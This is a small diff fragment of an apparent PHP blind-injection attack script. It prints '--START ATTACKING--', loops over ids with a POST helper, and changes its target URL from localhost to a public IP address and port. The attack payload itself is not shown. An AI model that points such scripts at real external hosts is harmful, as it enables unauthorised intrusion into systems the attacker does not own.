@@ -24,7 +24,7 @@ function post_request($url, $data) {
 
 echo "--START ATTACKING--\n";
 
-$url = 'http://localhost/ws/blind/';
+$url = 'http://202.125.94.123:2088/blind/';
 
 $id=1;
 while(true){
